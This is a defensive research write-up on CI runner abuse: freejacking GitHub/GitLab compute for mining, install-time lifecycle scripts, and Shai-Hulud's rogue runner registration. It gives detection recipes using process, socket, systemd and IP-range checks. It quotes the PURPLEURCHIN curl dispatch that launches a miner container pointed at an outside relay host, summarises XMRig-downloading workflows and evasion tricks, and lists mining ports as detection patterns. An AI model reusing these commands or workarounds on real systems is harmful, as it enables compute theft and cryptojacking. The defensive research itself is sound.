# CI Runners and Build Farms: Freejacking, Install-Time Egress, and Detecting an Ephemeral Runner

**Scope.** The CI/CD compute layer as an abused resource: GitHub Actions and GitLab CI hosted runners, self-hosted runner agents on machines that should not have them, and the install-time path (npm/pnpm/Yarn/Bun/pip lifecycle scripts) that turns a build into an egress event. Two questions: *is the traffic hitting my service coming from a CI runner*, and *is there a runner on this machine doing something I did not schedule?*

## Summary
- **GitHub-hosted runners are free and unlimited on public repos** (<https://docs.github.com/en/actions/reference/runners/github-hosted-runners>). Private-repo jobs draw a **dollar** allowance, not a minute count: GitHub Free includes **`$12 USD`/month** and `actions_linux` (Linux 2-core) bills **$0.006/min** — the familiar "2,000 minutes" is derived, not stated (<https://docs.github.com/en/billing/concepts/product-billing/github-actions>).
- **Ceilings are time, not bytes**: 6 h/job, 35 days/workflow, 20 concurrent jobs on Free (<https://docs.github.com/en/actions/reference/limits>); 3 h/job on GitLab.com (<https://docs.gitlab.com/ci/runners/hosted_runners/>). Bandwidth is **not metered at all**.
- **GitHub's product terms name the abuse**: "Actions should not be used for: Cryptomining; … don't use Actions as a content delivery network or as part of a serverless application … any other activity unrelated to the production, testing, deployment, or publication of the software project associated with the repository" (<https://docs.github.com/en/site-policy/github-terms/github-terms-for-additional-products-and-features>).
- **PURPLEURCHIN** (Sysdig TRT): 30+ GitHub accounts, 2,000 Heroku, 900 Buddy, 130+ Docker Hub images, a Node.js Stratum relay on **12000/14000/24000/32000/34000**, ~**$103,000** of GitHub resources, ~**$15/account/month** of provider cost (<https://www.sysdig.com/blog/massive-cryptomining-operation-github-actions>).
- **Runner source IPs are published and shared**: the `actions` key of `https://api.github.com/meta` returned **8,350 CIDRs** (5,622 IPv4 / 2,728 IPv6; 28,648,329 IPv4 addresses; 3,865 IPv4 prefixes after collapsing) at fetch time. GitHub names this API as *the* check and explains that reputation vendors flag these ranges *because* the infrastructure is shared (<https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/about-githubs-ip-addresses>).
- **The postinstall hole closed 2025→2026, but not on the runner image**: pnpm **10.0.0 (2025-01-07)** and npm **12.0.0 (2026-07-08)** both default to denying dependency lifecycle scripts, yet `ubuntu-24.04` at `20261026.354.1` ships **npm 10.9.9** and **Yarn 1.22.22**, which run them.
- **Shai-Hulud 2.0 registered victim machines as self-hosted GitHub runners**: `setup_bun.js` "downloaded and installed a GitHub Actions Runner archive … configured a new GitHub repository and a runner agent called *SHA1Hulud*" (<https://www.microsoft.com/en-us/security/blog/2025/12/09/shai-hulud-2-0-guidance-for-detecting-investigating-and-defending-against-the-supply-chain-attack>). The "runner that should not exist" case.
- **`IPAccounting=yes` (systemd ≥ 235)** yields per-runner-unit byte counters as `IPEgressBytes`/`IPIngressBytes` — no package, and it covers every socket a job opens because jobs are children of the service. The cheapest "is this a GitHub runner?" test is subnet membership against the `actions` key with `ipaddress` from the Python stdlib.

## 1. What is free, and in what unit

| Platform | Free allowance | Unit | Per-job cap | Concurrency |
|---|---|---|---|---|
| GitHub public repo | unlimited | none | 6 h | 20 (Free) |
| GitHub private, Free | `$12 USD`/mo | dollars → min at $0.006 | 6 h | 20 total, 5 macOS |
| GitLab.com Free | 400 compute minutes/mo | minutes × cost factor (`small` = 1) | 3 h | runner-dependent |
| Self-hosted GitHub runner | free (you own the box) | none | 5 days | `concurrent` / `limit` |

On a public repo nothing counts, so only the 6-hour timer and the 20-job cap remain — worked around with a `schedule:` cron matched to the timer plus `strategy: max-parallel`. Trend Micro's real miner workflow: `max-parallel: 50`, `fail-fast: false`, a 6×10 matrix for 60 jobs, `continue-on-error: true`, `--max-cpu-usage 70` (<https://www.trendmicro.com/en_us/research/22/g/unpacking-cloud-based-cryptocurrency-miners-that-abuse-github-ac.html>). `fail-fast: false` **plus** `continue-on-error: true` is a two-line static tell — nobody who wants a green build disables both.

GitLab's hosted runners are single-job Google Compute Engine VMs with **passwordless `sudo`** and firewalls that "only allow outbound communication from the ephemeral VM to the public internet" (<https://docs.gitlab.com/ci/runners/hosted_runners/>). GitLab shipped a **50,000-minute quota on public projects** for namespaces created on or after 2021-07-17 (<https://about.gitlab.com/blog/prevent-crypto-mining-abuse>).

## 2. Bandwidth: the dimension nobody prices

GitHub meters minutes, artifact and cache storage; it does not meter bytes out of a runner. The only documented rate is a floor: a self-hosted runner needs "at least 70 kilobits per second upload and download speed" (<https://docs.github.com/en/actions/reference/runners/self-hosted-runners>). Everything above that is unpriced, so a workflow that looks like a build can be a relay for six hours and re-arm from cron, sourcing from the same IP pool as real builds.

## 3. Documented campaigns, at reporting level

**PURPLEURCHIN.** Repositories created and used "within one or two days"; each holds only a workflow that runs a Docker image. A script (`userlinux8888`) writes the YAML, pushes it to `master` via SSH, and records the repo plus a bearer token; a second (`linuxwebapp88`) walks the account list and triggers each repo through the `workflow_dispatch` REST endpoint:

```javascript
curl --request POST --url "https://api.github.com/repos/$linuxweb8888/dispatches" \
  --header "authorization: Bearer $linuxweb88888874" \
  --data '{"event_type":"hello","client_payload":{"web1":"docker run -d linux88884474/webappweblinux88 /bin/bash /linux88 5.199.170.64 24000 ..."}}'
```

The miner ran **Tidecoin** `yespower` from `nodejs/index.js` rather than XMRig, so the process tree reads as a Node application. The Stratum relay listens on **12000, 14000, 24000, 32000, 34000**; Docker Hub images update two to six at a time so a scanner never sees the whole set.

**Trend Micro (2022-07-07).** Windows-runner matrices that `Invoke-WebRequest` XMRig, `Expand-Archive` it, and run `xmrig.exe --max-cpu-usage 70`; a `workflow_dispatch`-only variant; a second miner (`lang.exe`) committed but unused. Committing the same YAML to `workflows`, `.GitHub/workflows` and `.github/Workflows` puts the workflow in the *repository* — where code search finds it — not in a build artefact.

**Shai-Hulud 2.0 (2025).** npm worm; v1 used `postinstall`, v2 moved to `preinstall` so code runs before any test. Chain: `node` → `npm install` → `sh -c "bun run <obfuscated>.js && exit 1"` → Bun → harvester scanning Azure, GCP, K8s, Vault, SSH, npm tokens and wallets → **install a GitHub Actions runner named `SHA1HULUD`** on an attacker repo, with `TruffleHog` and `Runner.Listener` unpacked alongside. An install-time script need not exfiltrate directly — it can conscript the host into a build farm.

## 4. Install-time egress from package managers

| Installer | Runs dependency `pre/postinstall` by default? | Disable | Re-enable per package |
|---|---|---|---|
| npm ≤ 11 | **yes** | `--ignore-scripts`, `ignore-scripts=true` | `allowScripts` (11.16+), `--dangerously-allow-all-scripts` |
| npm ≥ 12.0.0 (2026-07-08) | **no** | n/a — default-deny | `npm install-scripts approve` then `npm rebuild` |
| pnpm ≥ 10.0.0 (2025-01-07) | **no** | n/a | `pnpm.onlyBuiltDependencies`, `pnpm approve-builds` |
| Yarn Berry (`master`) | **no** — `enableScripts` `default: false` | n/a | `dependenciesMeta.<pkg>.built: true` |
| Bun | **no** | n/a | `trustedDependencies` |
| pip (sdist) | **yes** — build backend runs | `--only-binary :all:` | n/a |

npm: `ignore-scripts` "Default: false … If true, npm does not run scripts specified in package.json files" (<https://docs.npmjs.com/cli/v11/using-npm/config#ignore-scripts>). v12 changelog, dated `(2026-07-08)`: "Dependency lifecycle scripts are now blocked by default unless allowed by the root package's `allowScripts` policy. After installing, run `npm install-scripts approve` to record approvals and `npm rebuild` to execute newly approved scripts." (<https://docs.npmjs.com/cli/v12/using-npm/changelog>). Companion change "root `preinstall` now runs before dependencies are installed": **root scripts still run**, so `--ignore-scripts` remains necessary.

pnpm 10.0.0: "Lifecycle scripts of dependencies are not executed during installation by default! … they should be listed in the `pnpm.onlyBuiltDependencies` field of `package.json`" (<https://github.com/pnpm/pnpm/releases/tag/v10.0.0>). Yarn Berry declares `enableScripts` `default: false` (<https://raw.githubusercontent.com/yarnpkg/berry/master/packages/yarnpkg-core/sources/Configuration.ts>), and the docs agree: "If false (the default), Yarn will not execute the `postinstall` scripts from third-party packages" (<https://yarnpkg.com/configuration/yarnrc>). Yarn **1.x**, still on the runner image, runs `postinstall` unconditionally. Bun: "Bun does not execute arbitrary lifecycle scripts by default, unlike other `npm` clients" (<https://bun.com/docs/pm/lifecycle>).

pip has no equivalent switch — an sdist is built by executing its declared backend, so install-time execution is designed behaviour. `--only-binary :all:` gives "Do not use source packages … Packages without binary distributions will fail to install" (<https://pip.pypa.io/en/stable/cli/pip_install/>); `--no-build-isolation` only removes the isolated env around the build, it does not skip it.

**The runner image, not your project, decides which default you get.** `ubuntu-24.04` at `20261026.354.1` ships **Npm 10.9.9**, **Node.js 22.23.4**, **Yarn 1.22.22**, **Pip 24.0**, kernel `7.0.0-1017-azure` (<https://raw.githubusercontent.com/actions/runner-images/main/images/ubuntu/Ubuntu2404-Readme.md>) — npm 10 predates default-deny, so `npm ci` on a stock runner still runs dependency lifecycle scripts unless the workflow passes `--ignore-scripts`.

One documented escalation: `tj-actions/changed-files` (CVE-2025-30066, patched v46.0.1) disclosed "secrets including … valid access keys, GitHub Personal Access Tokens (PATs), npm tokens, and private RSA keys" for workflows run between **2025-03-12 00:00 UTC and 2025-03-15 12:00 UTC**, entry point `reviewdog/action-setup@v1` between **2025-03-11 18:42 and 20:31 UTC** (<https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction>).

## 5. Detecting a runner on your own host

A runner is a long-lived **outbound-only** agent that spawns `Runner.Worker` children executing arbitrary repository code; everything interesting happens under those children, in the runner service's cgroup. Names to match, verified upstream:

- **processes** `Runner.Listener` (agent) and `Runner.Worker` (per job). Install root holds `_diag/` (constant `DiagDirectory = "_diag"`, <https://raw.githubusercontent.com/actions/runner/main/src/Runner.Common/Constants.cs>), `_diag/Runner_<UTC>.log`, `_diag/Worker_*.log` per job, and `.runner` / `.credentials`.
- **systemd** `actions.runner.<org>-<repo>.<runnerName>.service`, truncated at 80 chars, authoritative name in `~/actions-runner/.service` (<https://docs.github.com/en/actions/how-tos/manage-runners/self-hosted-runners/monitor-and-troubleshoot>).
- **environment, inherited by everything a job spawns**: `GITHUB_ACTIONS=true`, `RUNNER_ENVIRONMENT` = `github-hosted`|`self-hosted`, `RUNNER_NAME`, `RUNNER_OS` (<https://docs.github.com/en/actions/reference/workflows-and-actions/variables>).

The env var is the cheapest discriminator that exists — the miner, the relay, and the `curl` that fetched them all inherit it:

```bash
for p in /proc/[0-9]*; do
  if tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -qx 'GITHUB_ACTIONS=true'; then
    printf '%s %s\n' "${p#/proc/}" "$(tr '\0' ' ' < "$p/cmdline" 2>/dev/null | cut -c1-120)"
  fi
done
```

False positive: it does not distinguish a job you wanted from one you did not — only that the process is inside a runner. Its value is the delta: a `GITHUB_ACTIONS=true` process whose parent chain does not reach `Runner.Worker`, or one on a host with no runner service.


Attribution to a *unit* rather than a UID is what makes byte numbers meaningful:

```ini
# /etc/systemd/system/actions.runner.acme-web.repro-1.service.d/accounting.conf
[Service]
IPAccounting=yes
```

`IPAccounting=` "turns on IPv4 and IPv6 network traffic accounting … all IPv4 and IPv6 sockets created by any process of the unit are accounted for", **added in systemd 235** (<https://man7.org/linux/man-pages/man5/systemd.resource-control.5.html>), exposed as `IPIngressBytes`, `IPEgressBytes`, `IPIngressPackets`, `IPEgressPackets` (<https://www.freedesktop.org/software/systemd/man/latest/org.freedesktop.systemd1.html>), and "only available for system services, not for per-user services":

```bash
systemctl show -p IPIngressBytes -p IPEgressBytes actions.runner.acme-web.repro-1.service
```

Because all job processes are children of the service cgroup, this attributes egress to the runner — the granularity that survives an ephemeral runner destroyed after its job. It does **not** survive the unit restarting, so scrape it from `ExecStopPost=` or a timer rather than a polling loop.

Socket attribution needs no extra software. `ss` (tested on `iproute2-7.3.0`) supports `state STATE-FILTER`, a boolean `EXPRESSION` with `or`/`and`/`not` and parentheses, `{dst|src} HOST`, `{dport|sport} [OP] [FAMILY:]:PORT`, `dev`, `fwmark`, and **`cgroup [=|!=] PATH`** — "if the connection is part of a cgroup at the given path" (<https://raw.githubusercontent.com/iproute2/iproute2/main/man/man8/ss.8>):

```bash
ss -tnp state established '( dport = :3333 or dport = :5555 or dport = :7777 \
  or dport = :9999 or dport = :14444 or dport = :45700 \
  or dport = :12000 or dport = :24000 or dport = :32000 or dport = :34000 )'

ss -tnp cgroup /system.slice/actions.runner.acme-web.repro-1.service
```

`-p` prints the owning process only for sockets you may inspect; as non-root you get the socket and not the process for other users' connections.


The Stratum signature is a fixed prefix. XMRig builds its first request as `JsonRequest::create(doc, 1, "login", params)` and sends it newline-terminated, so the first bytes are `{"id":1,"jsonrpc":"2.0","method":"login","params":{...}}`; keepalives are `{"id":%d,"jsonrpc":"2.0","method":"keepalived","params":{"id":"..."}}` (<https://raw.githubusercontent.com/xmrig/xmrig/master/src/base/net/stratum/Client.cpp>). `{"id` is `0x7b226964`, so the classic computed-offset pcap match works on the first data segment:

```bash
tcpdump -ni any -s0 -A 'tcp dst port 3333 and tcp[((tcp[12] & 0xf0) >> 2):4] = 0x7b226964'
```

That is a first-segment heuristic — a segmented login is missed. The robust form is `tcpdump -ni any -s0 -A 'tcp port 3333' | grep -m1 '"method":"login"'`, at the cost of reading every payload on that port.

Job-boundary correlation with the documented hooks costs nothing. The runner executes `ACTIONS_RUNNER_HOOK_JOB_STARTED` and `ACTIONS_RUNNER_HOOK_JOB_COMPLETED` when they hold an absolute path, set in the runner's `.env`, "in the security context of the service account that's running the runner service" (<https://docs.github.com/en/actions/how-tos/manage-runners/self-hosted-runners/run-scripts>):

```bash
# ~/actions-runner/.env
ACTIONS_RUNNER_HOOK_JOB_STARTED=/usr/local/sbin/ci-start.sh
ACTIONS_RUNNER_HOOK_JOB_COMPLETED=/usr/local/sbin/ci-end.sh
```

Each hook appends `$GITHUB_RUN_ID`, `$GITHUB_REPOSITORY`, `$RUNNER_NAME` and `ss -Htn state established | awk '{print $4, $5}'` to a log. The start hook snapshots sockets before the job, the end hook after; anything present at start and gone at end, whose peer is off your allow-list, is the job's own traffic. Documented failure mode: hooks "are processed synchronously, so they will block job execution".

For syscall level, `auditd` on `execve` under the runner account is the companion technique; rule syntax, `a0`-based `socket()` family matching, and the `io_uring` caveat are in `research/auditd-proc-detection.md`.

## 6. Detecting runner-sourced traffic against your service

GitHub publishes the answer: "To verify whether an IP address belongs to GitHub-hosted runners, check the IP ranges returned by the Meta API" (<https://docs.github.com/en/actions/how-tos/troubleshoot-workflows>). The same page concedes the reputation problem — "Because the underlying infrastructure is shared, activity from other users of the same infrastructure can influence the reputation scores" — and the list "is not intended to be an exhaustive list".

Offline, with only the Python stdlib:

```bash
curl -qfsS https://api.github.com/meta -o /tmp/gh-meta.json
cat >/tmp/ghmatch.py <<'EOF'
import ipaddress, json, sys
nets = [ipaddress.ip_network(c) for c in json.load(open('/tmp/gh-meta.json'))['actions']]
for a in sys.argv[1:]:
    ip = ipaddress.ip_address(a)
    hit = [n for n in nets if n.version == ip.version and ip in n]
    print(a, "github-actions" if hit else "not-in-actions", hit[:1])
EOF
python3 /tmp/ghmatch.py 4.148.1.1 1.1.1.1
```

On that fetch, `4.148.1.1` reports `github-actions` and `1.1.1.1` does not. Collapse the set once (3,865 IPv4 prefixes) instead of walking 5,622 networks per request.

Caveats: `actions` is a superset of runner egress and includes infrastructure for other Actions functions; `hooks`, `web`, `git`, `pages`, `packages`, `codespaces` are separate keys, and webhooks come from `hooks`; the list changes, which is why GitHub says "We do not recommend allowing by IP address". Treat a hit as *provenance*, not intent.


For the other direction — what did *my* workflow talk to — StepSecurity Harden-Runner is free on public repos: eBPF-based, no kernel module, "Public repositories only" on the Community tier (<https://docs.stepsecurity.io/github-actions/harden-runner>):

```yaml
steps:
  - uses: step-security/harden-runner@v2   # v2.10.3
    with:
      egress-policy: audit        # or block, with allowed-endpoints:
```

In `block` mode anything outside `allowed-endpoints` is dropped and logged; the IOC Global Block List is enforced even in `audit` mode and is readable unauthenticated at `https://agent.api.stepsecurity.io/v1/global-blocklist`.

## 7. Detection recipe (cheapest first)

**R0 — is there a runner at all?** No packages, no root.
```bash
pgrep -af 'Runner\.Listener|Runner\.Worker'
systemctl list-units --type=service 'actions.runner.*' --all --no-pager
ls -la /home/*/actions-runner/.runner /home/*/actions-runner/.credentials 2>/dev/null
```
*FP:* `gitlab-runner` is a different agent (`/usr/bin/gitlab-runner`, `concurrent`/`limit`) and will not match. `.credentials` is normal on a machine you enrolled; the signal is presence on a machine whose inventory says otherwise. Shai-Hulud's agent was named `SHA1HULUD`; a `Runner.Listener` under `/tmp` or `.npm/_cacache` is not a build.

**R1 — what does the job environment claim?** The `/proc/*/environ` loop in §5. *FP:* set for the whole job, including your own legitimate steps.

**R2 — who is it talking to?** The `ss ... state established` port filter. *FP:* 3333, 5555, 7777 are ordinary dev-server ports (`npx http-server`, Android `adb` over TCP, node/game defaults); a dev server in CI is not a miner. Miners instead hold one host for hours with tiny requests and a keepalive roughly every 60 s.

**R3 — how much, per runner?** `IPAccounting=yes` plus `systemctl show -p IPEgressBytes`. *FP / limit:* counters reset when the unit restarts and `--ephemeral` runners restart per job; below systemd 235, sample `ss -tni` byte counters at R2.

**R4 — content check.** `tcpdump -A` on the suspect port, `grep '"method":"login"'` or `grep '"method":"keepalived"'`. Protocol-specific string; no known false positive.

**R5 — inbound provenance.** `api.github.com/meta` `actions` membership for any client IP behaving like a scanner or relay. *FP:* shared infrastructure means a hit is not a build you know about.

**R6 — job boundaries.** The two hooks writing socket snapshots. *FP:* hooks are synchronous, so slow storage shows as job latency; an ephemeral runner's `_diag` vanishes, which is why GitHub requires forwarding logs off-box before ephemeral autoscaling.

**R7 — syscall level.** `auditd` per `research/auditd-proc-detection.md`; costs a daemon and dropped-event tuning. Run it only after R0–R6 narrowed the window.

Two static checks on the workflow file cost nothing and precede all of it: `fail-fast: false` with `continue-on-error: true` in one job, and a `schedule:` cron whose period matches the per-job cap. Both appear in the Trend Micro workflow; neither in a healthy test suite.

## Sources

All fetched or read on 2026-10-31.

- <https://docs.github.com/en/actions/reference/runners/github-hosted-runners>
- <https://docs.github.com/en/actions/reference/limits>
- <https://docs.github.com/en/billing/concepts/product-billing/github-actions>
- <https://docs.github.com/en/site-policy/github-terms/github-terms-for-additional-products-and-features>
- <https://docs.github.com/en/site-policy/acceptable-use-policies/github-acceptable-use-policies>
- <https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/about-githubs-ip-addresses>
- <https://docs.github.com/en/actions/how-tos/troubleshoot-workflows>
- <https://api.github.com/meta>
- <https://docs.github.com/en/actions/reference/runners/self-hosted-runners>
- <https://docs.github.com/en/actions/how-tos/manage-runners/self-hosted-runners/monitor-and-troubleshoot>
- <https://docs.github.com/en/actions/how-tos/manage-runners/self-hosted-runners/run-scripts>
- <https://docs.github.com/en/actions/how-tos/manage-runners/self-hosted-runners/add-runners>
- <https://docs.github.com/en/actions/reference/workflows-and-actions/variables>
- <https://raw.githubusercontent.com/actions/runner/main/src/Runner.Common/Constants.cs>
- <https://raw.githubusercontent.com/actions/runner-images/main/images/ubuntu/Ubuntu2404-Readme.md>
- <https://docs.gitlab.com/ci/runners/hosted_runners/>
- <https://docs.gitlab.com/ci/pipelines/compute_minutes/>
- <https://docs.gitlab.com/runner/configuration/advanced-configuration/>
- <https://about.gitlab.com/blog/prevent-crypto-mining-abuse>
- <https://www.sysdig.com/blog/massive-cryptomining-operation-github-actions>
- <https://www.trendmicro.com/en_us/research/22/g/unpacking-cloud-based-cryptocurrency-miners-that-abuse-github-ac.html>
- <https://attack.mitre.org/techniques/T1496/>
- <https://docs.npmjs.com/cli/v11/using-npm/config>
- <https://docs.npmjs.com/cli/v12/using-npm/changelog>
- <https://github.com/pnpm/pnpm/releases/tag/v10.0.0>
- <https://raw.githubusercontent.com/yarnpkg/berry/master/packages/yarnpkg-core/sources/Configuration.ts>
- <https://yarnpkg.com/configuration/yarnrc>
- <https://bun.com/docs/pm/lifecycle>
- <https://pip.pypa.io/en/stable/cli/pip_install/>
- <https://www.microsoft.com/en-us/security/blog/2025/12/09/shai-hulud-2-0-guidance-for-detecting-investigating-and-defending-against-the-supply-chain-attack>
- <https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction>
- <https://docs.stepsecurity.io/github-actions/harden-runner>
- <https://man7.org/linux/man-pages/man5/systemd.resource-control.5.html>
- <https://www.freedesktop.org/software/systemd/man/latest/org.freedesktop.systemd1.html>
- <https://raw.githubusercontent.com/iproute2/iproute2/main/man/man8/ss.8>
- <https://raw.githubusercontent.com/xmrig/xmrig/master/src/base/net/stratum/Client.cpp>
- <https://cve.org/CVERecord?id=CVE-2025-30066>

## What I could not verify

- **That every runner egress socket sources from an `actions` range.** The docs say to check the Meta API and that the list is not exhaustive, but never state all runner traffic is inside `actions`; some may leave from `web`/`git`/`packages`.
- **That the ranges are current** — 8,350 CIDRs (5,622 v4) at fetch time.
- **A measured runner NIC rate.** No published figure; only the 70 kbit/s *minimum* for self-hosted connectivity.
- **Which npm release first shipped `allowScripts`** — v12.0.0 enforces it, but v11 (11.21.0) docs already describe it. Likewise unpinned: the Yarn release where `enableScripts` flipped to `false` (`master` and the docs agree, but tag-pinned `Configuration.ts` copies 404'd).
- **`IPAccounting` reset behaviour on unit restart** — inferred, not documented.
- **Any volumetric threshold** at which a 6-hour job at line rate trips enforcement before human review; none is published.
